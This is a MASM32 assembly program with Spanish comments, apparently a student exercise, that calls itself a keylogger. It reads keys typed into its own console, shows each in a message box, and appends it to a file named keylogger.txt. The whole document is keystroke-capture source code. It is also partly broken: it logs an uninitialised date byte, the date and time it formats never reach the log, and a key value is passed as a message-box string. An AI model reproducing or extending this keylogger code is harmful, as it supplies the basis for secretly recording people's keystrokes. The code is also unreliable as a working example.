.386
;model
.model flat, stdcall				;flat es como small
option casemap:none
;includes
include \masm32\include\windows.inc
include \masm32\include\kernel32.inc
include \masm32\include\masm32.inc
include \masm32\include\masm32rt.inc
include \masm32\include\user32.inc
;librerias
includelib \masm32\lib\kernel32.lib
includelib \masm32\lib\masm32.lib
includelib \masm32\lib\user32.lib

WinMain proto :DWORD, :DWORD, :DWORD, :DWORD
;data segment
.data

	directorio		byte "keylogger.txt",NULL
	error1			db "No se pudo crear el archivo",0
	inicio			db "Keylogger iniciado", 10, 0
	continuacion	db "Presione una tecla para continaur", 10, 0
	slash			dw "/",NULL
	puntos			dw ":",NULL

	sysTime			SYSTEMTIME <>
	org sysTime
	wYear			dw 0
	wMonth			dw 0
	wToDay			dw 0 ; Sunday 0 to Saturday 6
	wDay			dw 0
	wHour			dw 0
	wMinute			dw 0
	wSecond			dw 0
	wKsecond		dw 0
	date_buf		db 50 dup (32)
	time_buf		db 20 dup (32)
	dateformat		db " dddd, MMMM, dd, yyyy", 0
					db 0
	timeformat		db "hh:mm:ss tt",0

.data?
	fecha			dw ?
	manejo			dd ?
	key				dd ?
	bytesw			dd ?
.code
program:
	call main
	main proc
		

		INVOKE StdOut, addr inicio			; Imprime el mensaje de inicio
		INVOKE StdOut, addr continuacion	; Imprime el mensaje de presionar una tecla para continuar

		mov edx, offset directorio			; Coloca el nombre del archivo en el registro edx
		
		INVOKE CreateFile, edx, GENERIC_WRITE OR GENERIC_READ, FILE_SHARE_READ OR FILE_SHARE_WRITE, NULL, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL,NULL			; Crea y abre el archivo para escribir
		INVOKE SetFilePointer, eax, 0, 0, FILE_END				; Coloca el puntero

		mov manejo, eax
		cmp eax, INVALID_HANDLE_VALUE	;Error de creacion del archivo
		je fin_programa

		keylogger:

		call crt__getch
		mov key, eax
		cmp eax, 0
		je seguir

		;invoke GetKeyNameTextA, WM_CHAR, addr key, 64
		invoke MessageBox,NULL,addr key,addr key,MB_OK

		;invoke StdIn, addr key, 1
		
		INVOKE CreateFile, addr directorio, GENERIC_WRITE OR GENERIC_READ, FILE_SHARE_READ OR FILE_SHARE_WRITE, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL,0
		mov manejo, eax
		INVOKE SetFilePointer, manejo, 0, 0, FILE_END
		INVOKE WriteFile,manejo,addr key,1,addr bytesw,NULL
		INVOKE WriteFile,manejo,addr fecha,1,addr bytesw,NULL
		mov eax, manejo
		INVOKE CloseHandle, eax

		mov ebx, key						;moviendo la entrada a la variable "key"
		cmp ebx, 20h						;si es un espacio
		JZ ObtenerFH
		cmp ebx, 0ah						;si es un ENTER
		JZ ObtenerFH
		jmp seguir							;de lo contrario, sigue leyendo teclado

		ObtenerFH:
			invoke   GetDateFormat, 0, 0, \
				0, ADDR dateformat, ADDR date_buf, 50
			mov   ecx, offset date_buf
			add   ecx, eax; add length returned by GetDateFormat
			mov   byte ptr [ecx-1], " " ;replace null with space
			invoke   GetTimeFormat, 0, 0, \
				0, ADDR timeformat, ecx, 20

		seguir:
		;invoke StdOut, addr key
		jmp keylogger


		fin_programa:
		invoke ExitProcess,0
	main endp
end program